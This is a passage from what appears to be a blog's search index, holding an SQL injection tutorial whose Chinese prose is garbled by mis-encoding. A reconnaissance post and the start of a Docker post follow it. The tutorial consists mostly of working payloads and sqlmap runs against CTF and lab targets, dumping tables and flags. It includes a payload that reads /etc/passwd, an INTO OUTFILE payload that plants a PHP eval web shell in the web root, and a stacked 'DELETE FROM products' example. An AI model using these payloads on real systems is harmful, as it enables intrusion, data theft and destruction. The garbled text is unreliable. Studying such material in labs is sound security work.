'\n2\n'''\n```\n\nç¡®å®šäº†å›æ˜¾çš„ä½ç½®æ˜¯2\n\n**æŸ¥è¯¢ä¿¡æ¯**\n\n```objectivec\n#æŸ¥è¯¢æ•°æ®åº“\n?id=-1%aa' union select 1,database()  --+\n'''\nsae-chinalover\n'''\n    \n#æŸ¥è¯¢è¡¨å\n?id=-1%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n'''\nctf,ctf2,ctf3,ctf4,news\n'''  \n    \n#æŸ¥è¯¢å­—æ®µå\n?id=-1%aa' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x63746634 --+\n\n'''è¿™é‡Œè¡¨åtable_nameçš„å€¼å¿…é¡»è½¬æ¢æˆ16è¿›åˆ¶ï¼Œå¦‚æœä¸ç”¨16è¿›åˆ¶å°±å¾—ç”¨å¼•å·åŒ…è£¹ï¼Œå½“æœ‰addlasheså‡½æ•°å°±ä¼šè½¬ä¹‰å¼•å·ï¼Œå°±ä¼šå¯¼è‡´æŸ¥è¯¢å¤±è´¥ï¼Œä½¿ç”¨16è¿›åˆ¶é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚\nid,flag\n'''\n#æŸ¥è¯¢å­—æ®µä¿¡æ¯\n?id=-1%aa' union select 1,group_concat(id,0x3a,flag) from ctf4 --+\n'''\n1:flag{this_is_sqli_flag}\n'''\n    \n?id=-1%aa' union select 1,group_concat(content) from ctf2 --+     \n'''\nh4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,the flag is:nctf{query_in_mysql},h4cked_By_w00dPeck3r    \n'''    \n```\n\næœ‰2ä¸ªflagï¼ŒæˆåŠŸå¾—åˆ°flag\n\n#### **ä½¿ç”¨sqlmap**\n**æ–¹æ³•ä¸€ï¼š**æ™®é€šæ–¹æ³•,æ ¹æ®æç¤ºé€‰æ‹©é€‰é¡¹\n\n```sql\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\"\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" --dbs\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" -D sae-chinalover  --tables\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" -D sae-chinalover  -T --columns\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" -D sae-chinalover -T ctf4 -C flag --dump\n\n\n```\n\n**æ–¹æ³•äºŒï¼š**ä½¿ç”¨è„šæœ¬ï¼š`unmagicquotes.py`ã€ä½œç”¨ï¼šå®½å­—ç¬¦ç»•è¿‡ã€‘\n\n```sql\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\" --tamper unmagicquotes --dbs\n'''\navailable databases [2]:                                                                       [*] information_schema\n[*] sae-chinalover\n'''\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\" --tamper unmagicquotes -D sae-chinalover --tables\n'''\nDatabase: sae-chinalover\n[6 tables]\n+---------+\n| ctf     |\n| ctf2    |\n| ctf3    |\n| ctf4    |\n| gbksqli |\n| news    |\n+---------+\n'''\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" --tamper unmagicquotes -D sae-chinalover -T ctf4 --columns\n'''\nDatabase: sae-chinalover                                                                                                   \nTable: ctf4\n[2 columns]\n+--------+--------------+\n| Column | Type         |\n+--------+--------------+\n| flag   | varchar(100) |\n| id     | int(10)      |\n+--------+--------------+\n'''\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" --tamper unmagicquotes -D sae-chinalover -T ctf4 -C flag --dump\n'''\nDatabase: sae-chinalover\nTable: ctf4\n[1 entry]\n+-------------------------+\n| flag                    |\n+-------------------------+\n| flag{this_is_sqli_flag} |\n+-------------------------+\n'''\n```\n\n**æ–¹æ³•ä¸‰**ï¼šç›´æ¥æŸ¥è¯¢flagå­—æ®µ\n\n```sql\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27\" --search -C flag\n--level 3 --risk 1 --thread 10\n'''\n--threads 10 //å¦‚æœä½ ç©è¿‡ msfconsoleçš„è¯ä¼šå¯¹è¿™ä¸ªå¾ˆç†Ÿæ‚‰ sqlmapçº¿ç¨‹æœ€é«˜è®¾ç½®ä¸º10\n--level 3 //sqlmapé»˜è®¤æµ‹è¯•æ‰€æœ‰çš„GETå’ŒPOSTå‚æ•°ï¼Œå½“--levelçš„å€¼å¤§äºç­‰äº2çš„æ—¶å€™ä¹Ÿä¼šæµ‹è¯•HTTP Cookieå¤´çš„å€¼ï¼Œå½“å¤§äºç­‰äº3çš„æ—¶å€™ä¹Ÿä¼šæµ‹è¯•User-Agentå’ŒHTTP Refererå¤´çš„å€¼ã€‚æœ€é«˜å¯åˆ°5\n--risk 3 // æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰riskè¶Šé«˜ï¼Œè¶Šæ…¢ä½†æ˜¯è¶Šå®‰å…¨\n--search //åé¢è·Ÿå‚æ•° -D -T -C æœç´¢åˆ—ï¼ˆCï¼‰ï¼Œè¡¨ï¼ˆTï¼‰å’Œæˆ–æ•°æ®åº“åç§°ï¼ˆDï¼‰ å¦‚æœä½ è„‘å­å¤Ÿèªæ˜ï¼Œåº”è¯¥çŸ¥é“åº“åˆ—è¡¨åä¸­å¯èƒ½ä¼šæœ‰ctf,flagç­‰å­—æ ·\n'''\n```\n\n## äº”ã€æŠ¥é”™æ³¨å…¥\n\n### flooræŠ¥é”™æ³¨å…¥/åŒæŸ¥è¯¢æ³¨å…¥\n\n> åŒæŸ¥è¯¢æŠ¥é”™/flooræŠ¥é”™æ³¨å…¥æ˜¯ç”±äº`rand()`ï¼Œ`count()`ï¼Œ`group by` ï¼Œ`floor`å››ä¸ªè¯­å¥è”åˆä½¿ç”¨é€ æˆçš„ï¼Œç¼ºä¸€ä¸å¯ã€‚\n\nä¸€äº›ç ”ç©¶äººå‘˜å‘ç°ï¼Œä½¿ç”¨`group by`å­å¥ç»“åˆ`rand()`å‡½æ•°ä»¥åŠåƒ`countï¼ˆ*ï¼‰`è¿™æ ·çš„èšåˆå‡½æ•°ï¼Œåœ¨SQLæŸ¥è¯¢æ—¶ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™ç§é”™è¯¯æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œè¿™å°±äº§ç”Ÿäº†åŒé‡æŸ¥è¯¢/flooræŠ¥é”™æ³¨å…¥ã€‚ä½¿ç”¨`floor()`å‡½æ•°åªæ˜¯ä¸ºäº†å°†æŸ¥è¯¢ç»“æœåˆ†ç±»\n\néœ€ç”¨åˆ°å››ä¸ªå‡½æ•°å’Œä¸€ä¸ª`group by`è¯­å¥ï¼š\n\n1. `group by ...` --->åˆ†ç»„è¯­å¥ //å°†æŸ¥è¯¢çš„ç»“æœåˆ†ç±»æ±‡æ€»\n2. `rand()` --->éšæœºæ•°ç”Ÿæˆå‡½æ•°\n3. `floor()` --->å–æ•´å‡½æ•° //ç”¨æ¥å¯¹ç”Ÿæˆçš„éšæœºæ•°å–æ•´\n4. `concat()`ã€ `concat_ws()`--->è¿æ¥å­—ç¬¦ä¸²\n5. `count()` --->ç»Ÿè®¡å‡½æ•° //ç»“åˆgroup byè¯­å¥ç»Ÿè®¡åˆ†ç»„åçš„æ•°æ®\n\nè¿˜éœ€è¦äº†è§£å“ˆ`å­æŸ¥è¯¢`ï¼š\n\nå­æŸ¥è¯¢åˆç§°ä¸ºå†…éƒ¨æŸ¥è¯¢ï¼Œå­æŸ¥è¯¢å…è®¸æŠŠä¸€ä¸ªæŸ¥è¯¢åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢å½“ä¸­ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯ä¸€ä¸ªselectä¸­åˆåµŒå¥—äº†ä¸€ä¸ªselectï¼ŒåµŒå¥—çš„è¿™ä¸ªselectè¯­å¥å°±æ˜¯ä¸€ä¸ªå­æŸ¥è¯¢ã€‚\n\n```sql\nselect concat(\"-\",(select database()));\n```\n\n**åŒæŸ¥è¯¢/flooræŠ¥é”™æ³¨å…¥å…¬å¼ï¼š**\n\n```sql\n#è·å–æ•°æ®åº“å\n?id=-1' union select 1,count(*),concat_ws('-',(select database()),floor(rand(0)*2))as a from information_schema.tables group by a--+\næˆ–è€…\n?id=1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+\n\n#è·å–è¡¨å\n?id=-1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2))as a from information_schema.tables group by a--+\næˆ–è€…\n?id=1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+\n```\n\nä½¿ç”¨å¦‚ä¸ŠSQLè¯­å¥ï¼Œå‘ç°å¤šæŸ¥è¯¢å‡ æ¬¡ä¼šçˆ†å‡º`Duplicate entry`çš„é”™è¯¯ï¼Œå¹¶ä¸”å°†æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯éƒ½çˆ†å‡ºæ¥äº†ã€‚\n\n**å®ä¾‹ï¼š**\n\nSQLi-LABSç¬¬äº”å…³:https://jwt1399.top/posts/30333.html#toc-heading-5\n\n**åŒæ³¨å…¥è¯¦ç»†åŸç†è¯·å‚è€ƒï¼š**\n\n[åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥](https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html)ã€[åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥åŸç†æ¢ç´¢](https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html#_caption2)\n\n### updatexmlæŠ¥é”™æ³¨å…¥\n\n> `updatexml(xml_target, XPath_string, new_value)`ï¼šè¿”å›æ›¿æ¢çš„XMLç‰‡æ®µ\n\n| å‚æ•°         | æè¿°                          |\n| ------------ | ----------------------------- |\n| XML_document | Stringæ ¼å¼ï¼Œéœ€è¦æ“ä½œçš„xmlç‰‡æ®µ |\n| XPath_string | éœ€è¦æ›´æ–°çš„xmlè·¯å¾„(Xpathæ ¼å¼)  |\n| new_value    | Stringæ ¼å¼ï¼Œæ›´æ–°åçš„å†…å®¹      |\n\n**Payload:**\n\n```sql\nupdatexml(1,concat(0x7e,(select database()),0x7e),1);\n```\n\n![](https://img.jwt1399.top//img/20200726170613.png)\n\nå¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ã€‚åˆ©ç”¨concatå‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡ºã€‚\n\n`concat()`å‡½æ•°æ˜¯å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆ**XPATH_string**çš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯ï¼Œçˆ†å‡ºæ•°æ®åº“\n\n`0x7e`ä¸ºhexç ,å®ä¸º`~`,ä¸ºäº†ä½¿Xpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯\n\n### extractvalueæŠ¥é”™æ³¨å…¥\n\n> `extractvalue(xml_frag, xpath_expr)`ï¼šä½¿ç”¨XPathè¡¨ç¤ºæ³•ä»XMLå­—ç¬¦ä¸²ä¸­æå–å€¼\n\n| å‚æ•°       | æè¿°                       |\n| ---------- | -------------------------- |\n| xml_frag   | ç›®æ ‡xmlæ–‡æ¡£                |\n| xpath_expr | Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œxmlè·¯å¾„ |\n\n**Payload:**\n\n```sql\nextractvalue(1,concat(0x7e,(select database()),0x7e));\n```\n\n![](https://img.jwt1399.top//img/20200726170721.png)\n\nå¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ã€‚åˆ©ç”¨concatå‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡ºã€‚\n\n## å…­ã€äºŒæ¬¡æ³¨å…¥\n\nå¾…æ›´ã€‚ã€‚ã€‚\n\n## ä¸ƒã€å †å æ³¨å…¥\n\n### åŸç†\n\nåœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡SQLè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨åˆ†å·ï¼ˆ;ï¼‰ç»“æŸåä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚\nç”¨æˆ·è¾“å…¥ï¼š`1; DELETE FROM products`\næœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š`select * from products where productid=1;DELETE FROM products`\nå½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤\n\n\n\nå‚è€ƒ[SQLæ³¨å…¥-å †å æ³¨å…¥](https://www.cnblogs.com/0nth3way/articles/7128189.html#autoid-0-0-0)\n\n## å…«ã€HTTP headeræ³¨å…¥\n\n> HTTPå¤´æ³¨å…¥å…¶å®å¹¶ä¸æ˜¯ä¸€ä¸ªæ–°çš„SQLæ³¨å…¥ç±»å‹ï¼Œè€Œæ˜¯æŒ‡å‡ºç°SQLæ³¨å…¥æ¼æ´çš„åœºæ™¯ã€‚\n> æœ‰äº›æ—¶å€™ï¼Œåå°å¼€å‘äººå‘˜ä¸ºäº†éªŒè¯å®¢æˆ·ç«¯å¤´ä¿¡æ¯ï¼ˆæ¯”å¦‚å¸¸ç”¨çš„cookieéªŒè¯ï¼‰\n> æˆ–è€…é€šè¿‡HTTP headerå¤´ä¿¡æ¯è·å–å®¢æˆ·ç«¯çš„ä¸€äº›èµ„æ–™ï¼Œæ¯”å¦‚User-Agentã€Acceptå­—æ®µç­‰ã€‚\n> ä¼šå¯¹å®¢æˆ·ç«¯çš„HTTP headerä¿¡æ¯è¿›è¡Œè·å–å¹¶ä½¿ç”¨SQLè¿›è¡Œå¤„ç†ï¼Œå¦‚æœæ­¤æ—¶æ²¡æœ‰è¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘åˆ™å¯èƒ½ä¼šå¯¼è‡´åŸºäºHTTP headerçš„SQL Injectæ¼æ´ã€‚\n\n### Cookie æ³¨å…¥\n\n#### åŸç†\n\n**Cookieæ³¨å…¥çš„åŸç†ï¼š**\n\nphpä¸­ï¼Œä½¿ç”¨è¶…å…¨å±€å˜é‡ `$_GET`ï¼Œ`$_POST`æ¥æ¥å—å‚æ•°ã€‚ aspä¸­ï¼Œä½¿ç”¨ `Request.QueryString (GET)`æˆ– `Request.Form (POST)`æ¥æ¥æ”¶é¡µé¢æäº¤çš„å‚æ•°å€¼ã€‚ æœ‰äº›ç¨‹åºå‘˜ç›´æ¥è¿™ä¹ˆå†™ï¼š`$id = $_REQUEST['id'];`è¿™æ—¶å€™PHPä¸çŸ¥é“ï¼Œåº”è¯¥ä»GETè¿˜æ˜¯POSTæ–¹å¼ä¸Šæ¥æ”¶å‚æ•° ï¼Œå®ƒå°±ä¼šä¸€ä¸ªä¸€ä¸ªå»è¯•ï¼Œå®ƒæ˜¯å…ˆå–GETä¸­çš„æ•°æ®ï¼Œå†å–POSTä¸­çš„æ•°æ®ï¼Œè¿˜ä¼šå»å–Cookiesä¸­çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰åšå¥½é˜²æŠ¤æªæ–½å°±å®¹æ˜“å¯¼è‡´å­˜åœ¨cookieæ³¨å…¥ã€‚\n\n**Cookieæ³¨å…¥ç‰¹å¾ï¼š**é€šè¿‡ä¿®æ”¹Cookieçš„å€¼è¿›è¡Œæ³¨å…¥ï¼ŒCookieæ³¨å…¥è·Ÿæ™®é€šsqlæ³¨å…¥è¿‡ç¨‹ä¸€æ ·\n\n**Cookieæ³¨å…¥æ–¹æ³•ï¼š**\n\n**æ–¹æ³•ä¸€ï¼š**BurpSuiteæŠ“åŒ…ä¿®æ”¹Cookieè¿›è¡Œæ³¨å…¥\n\n**æ–¹æ³•äºŒï¼š**ä½¿ç”¨SqlMapè¿›è¡Œæ³¨å…¥\n\n```bash\npython sqlmap.py -u \"http://xxx.com\" --cookie \"id=x\" --dbs --level 2 \n```\n\n#### å®ä¾‹\n\n**é¢˜ç›®æ¥æºï¼šCTFHub-WebæŠ€èƒ½æ ‘-Cookieæ³¨å…¥**\n\né¢˜ç›®å·²ç»å¾ˆæ˜æ˜¾æç¤ºæ˜¯cookieæ³¨å…¥ï¼Œæ‰“å¼€BurpsuiteæŠ“åŒ…\n\næŠ“åŒ…ä¹‹åå¯ä»¥çœ‹åˆ°cookieé‡Œé¢æœ‰idå‚æ•°ï¼Œæˆ‘ä»¬å°è¯•è¿›è¡Œæ³¨å…¥ï¼Œæœç„¶å¯ä»¥æˆåŠŸæ³¨å…¥\n\n![](https://img.jwt1399.top//img/20200719102419.png)\n\nåç»­å°±æ˜¯ä¿®æ”¹Cookieè¿›è¡Œæ™®é€šçš„æ•°å­—å‹æ³¨å…¥å°±å¯ä»¥äº†\n\n```sql\n#ç¡®å®šå­—æ®µæ•°ã€å­—æ®µæ•°ä¸º2ã€‘\nCookie: id=1 order by 1\nCookie: id=1 order by 2\nCookie: id=1 order by 3\n\n#ç¡®å®šå­—æ®µé¡ºåº\nCookie: id=-1 union select 1,2\n\n#çˆ†æ•°æ®åº“åã€sqliã€‘\nCookie: id=-1 union select 1,database()\n\n#çˆ†è¡¨åã€news,ztikrnhkasã€‘\nCookie: id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'\n\n#çˆ†åˆ—åã€rcdrtihzyrã€‘\nCookie: id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='ztikrnhkas'\n\n#çˆ†å€¼\nCookie: id=-1 union select 1,rcdrtihzyr from ztikrnhkas\n```\n\n![](https://img.jwt1399.top//img/20200719103005.png)\n\n\n\n### XFFæ³¨å…¥\n\nå¾…æ›´ã€‚ã€‚ã€‚\n\n### UAæ³¨å…¥\n\nå¾…æ›´ã€‚ã€‚ã€‚\n\n## ä¹ã€è¯»å†™æ–‡ä»¶\n\n#### è¯»å–æ–‡ä»¶å‡½æ•°\n\n`load_fileï¼ˆfile_nameï¼‰`ï¼šè¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\n\n**ä½¿ç”¨å‰æï¼š**\n\n- å¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¿…é¡»å®Œå…¨å¯è¯»\n- å¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´è·¯å¾„\n- èƒ½å¤Ÿä½¿ç”¨unionæŸ¥è¯¢ï¼ˆsqlæ³¨å…¥æ—¶ï¼‰\n- å¯¹Webç›®å½•æœ‰å†™æƒé™ç”¨æˆ·å¿…é¡»æœ‰secure_file_priv=æ–‡ä»¶æƒé™\n- æ¬²è¯»å–æ–‡ä»¶å¿…é¡»å°äºmax_allowed_packetdeçš„å…è®¸å€¼\n\n**secure_file_privçš„å€¼**\n\n| è®¾ç½®                   | å«ä¹‰                                      |\n| ---------------------- | ----------------------------------------- |\n| secure_file_prive=null | é™åˆ¶mysqlä¸å…è®¸å¯¼å…¥/å¯¼å‡º                  |\n| secure_file_priv=/tmp/ | é™åˆ¶mysqlçš„å¯¼å…¥/å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ |\n| secure_file_priv=ç©º    | ä¸é™åˆ¶mysqlçš„å¯¼å…¥/å¯¼å‡º                    |\n\nmysqlä¸‹æ‰§è¡Œ`show global variables like '%secure%';`å¯ä»¥æŸ¥çœ‹`secure_file_priv`çš„å€¼\n\n\n\n#### å†™æ–‡ä»¶å‡½æ•°\n\n`into outfile`\n\n### å®ä¾‹\n\né¶æœºï¼šsqli-labsç¬¬7å…³\n\n```mysql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ«\n?id=1 and 1=1 \n?id=1 and 1=2\n#You are in.... Use outfile......\n\n#ç¡®å®šå­—æ®µæ•°\n?id=1' order by 3 --+\n?id=1')) order by 4  --+\n#è”åˆæŸ¥è¯¢æŸ¥çœ‹æ˜¾ç¤ºä½\n?id=-1 union select 1,2,3\n\n?id=-1')) union select 1,load_file('/etc/passwd'),3 --+\n\n?id=-1')) union select 1,('<?php @eval($_POST[\"pass\"])?>'),3  into outfile \"/var/www/html/a.php\"--+\n```\n\n### sqlmapè¯»å–æ–‡ä»¶\n\n--file-readç”¨æ³•ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶\n\n```bash\npython sqlmap.py -u \"http://xxx/x?id=1\" --file-read=/etc/passwd\n```\n\n\n## åã€SQLæ³¨å…¥é¶åœº\n\nä»¥ä¸‹é“¾æ¥å‡ä¸ºæˆ‘å…¶ä»–æ–‡ç« çš„SQLæ³¨å…¥é¶åœºçš„å­¦ä¹ è®°å½•\n\n**SQLi-LABS**\n\n SQLi-LABSå­¦ä¹ ç¬”è®°ï¼šhttps://jwt1399.top/posts/30333.html\n\n**DVWA-SQL**\n\nWebåŸºç¡€æ¼æ´-DVWA(SQLæ³¨å…¥éƒ¨åˆ†)ï¼šhttps://jwt1399.top/posts/27769.html#toc-heading-16\n\n**Pikachu-SQL**\n\nPikachuæ¼æ´å¹³å°é€šå…³è®°å½•(SQLæ³¨å…¥éƒ¨åˆ†)ï¼šhttp://127.0.0.1:4000/posts/30313.html#toc-heading-13\n\n# ä¸€äº›æ„Ÿæ‚Ÿ\n\næˆ‘è‡ªå·±æˆ‘åœ¨å­¦ä¹ Webå®‰å…¨çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿæ˜¯å€æ„Ÿæ¯ç‡¥ï¼Œæ€»æƒ³æ€¥äºæ±‚æˆï¼Œæƒ³è¦ç®€å•å­¦ä¸€å“ˆå°±èƒ½å®ç°å„ç§ğŸ„ğŸºæ“ä½œï¼Œæ˜¾ç„¶ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“çš„ï¼Œæ‰€ä»¥è¯·é™ä¸‹å¿ƒæ¥é’»ç ”å§ï¼Œæ…¢æ…¢æ¥ï¼Œæ¯”è¾ƒå¿«ï¼\n\n# èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["MySQL"],"categories":["SQL"]},{"title":"ä¿¡æ¯æ”¶é›†","url":"/posts/46544.html","content":"\n<font color=pink size=5>æ¸—é€æµ‹è¯•çš„æœ¬è´¨æ˜¯ä¿¡æ¯æœé›†ã€‚</font> \n\n## **å…¬å¸ä¿¡æ¯**\n\nå…¬å¸ä½ç½®ã€å…¬å¸ä¸šåŠ¡ã€å…¬å¸æ ¸å¿ƒäººå‘˜ã€å…¬å¸ç½‘ç«™\n\nå·¥å…·ï¼š[å¤©çœ¼æŸ¥](https://www.tianyancha.com/)ã€[ä¼æŸ¥æŸ¥](https://www.qichacha.com/)\n\n## **ç½‘ç«™ä¿¡æ¯**\n\nå·¥å…·ï¼š[ç«™é•¿ä¹‹å®¶](https://www.chinaz.com/)ã€[å¾®æ­¥](https://x.threatbook.cn/)ã€[çˆ±ç«™](https://www.aizhan.com/)\n\n## **ä¼ä¸šå¤‡æ¡ˆä¿¡æ¯**\n\nå·¥å…·ï¼š[å›½å®¶ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ](http://cq.gsxt.gov.cn/index.html)ã€[ICPå¤‡æ¡ˆæŸ¥è¯¢](http://www.beianbeian.com/)\n\n## **ç½‘ç«™å­åŸŸå**\n\nå·¥å…·ï¼šLayerå­åŸŸåæŒ–æ˜å·¥å…·ã€[Sublist3r](https://github.com/aboul3la/Sublist3r)ã€[bugscaner](http://tools.bugscaner.com/subdomain/)\n\n## **ç½‘ç«™æ¶æ„**\n\nè¯­è¨€ï¼šjspã€phpã€aspã€pythonã€‚ã€‚ã€‚\nä¸­é—´ä»¶ï¼šapacheã€iisã€tomcatã€jboss\næ•°æ®åº“ï¼šmysqlã€oracleã€sqlserverã€accessï¼‰\næ“ä½œç³»ç»Ÿï¼šlinuxã€windows\n\nå·¥å…·ï¼šæµè§ˆå™¨æ’ä»¶--Wappalyzer\n\n## **OSç‰ˆæœ¬ã€ç«¯å£ä¿¡æ¯**\n\nå·¥å…·ï¼šNmap\n\nnmap -sV IP  æŸ¥çœ‹ç«¯å£å’Œå¯¹åº”æœåŠ¡\n\nnmap -O IP  æŸ¥çœ‹æ“ä½œç³»ç»Ÿ\n\n## **æŒ‡çº¹è¯†åˆ«**\n\nå·¥å…·ï¼š[äº‘æ‚‰](https://www.yunsee.cn/)ã€[Netcraft](https://sitereport.netcraft.com/)ã€[åœ¨çº¿æŒ‡çº¹è¯†åˆ«](http://whatweb.bugscaner.com/)ã€Wappalyzeræ’ä»¶\n\n## **æ—ç«™å’ŒCæ®µ**\n\næ—ç«™ï¼šå’Œç›®æ ‡ç½‘ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„å…¶å®ƒç½‘ç«™\n\nCæ®µï¼šå’Œç›®æ ‡æœåŠ¡å™¨IPå¤„äºåŒä¸€ä¸ªç½‘æ®µçš„å…¶å®ƒæœåŠ¡å™¨\n\næŸ¥æ—ç«™:\n\nhttps://www.webscan.cc/\n\nhttp://s.tool.chinaz.com/same\n\n[æŸ¥Cæ®µ](https://www.maxmind.com/en/home)+nmap\n\n![](../images/%E5%AE%9E%E8%AE%AD%E7%AC%94%E8%AE%B0/image-20200601221120257.png)\n\nnmap -sP 117.50.0.0/17     -*sP*å‘ç°æ‰«æç½‘ç»œå­˜æ´»ä¸»æœº\n\n## ç»•è¿‡CDNå¯»æ‰¾çœŸå®IP\n\n1ã€æ‰«æå­åŸŸåå¯»æ‰¾çœŸå®IP\n\n2ã€å›½å¤–ç½‘ç«™å¤šåœ°ping\n\n[asm.ca.com](https://asm.ca.com/en/ping.php)\n\n3ã€æŸ¥è¯¢å†å²åŸŸåè§£æè®°å½•\n\n[Netcraft](https://sitereport.netcraft.com/)ã€[å¾®æ­¥](https://x.threatbook.cn/)\n\n4ã€phpinfoä¿¡æ¯æ³„éœ²å¯»æ‰¾çœŸå®IP,phpinfoçš„server_addrè®°å½•äº†æœåŠ¡å™¨çš„çœŸå®IP","tags":["ä¿¡æ¯æ”¶é›†"],"categories":["Web"]},{"title":"ä¸€æ–‡å­¦ä¼šDockerä½¿ç”¨","url":"/posts/39812.html","content":"\n## å‰è¨€\n\nDockeræˆ‘ä»¥å‰å­¦è¿‡ï¼Œä½†æ˜¯å¤ªä¹…æ²¡ç”¨ï¼Œå¿˜å¾—å·®ä¸å¤šäº†ã€‚ã€‚ã€‚è¿™å‡ 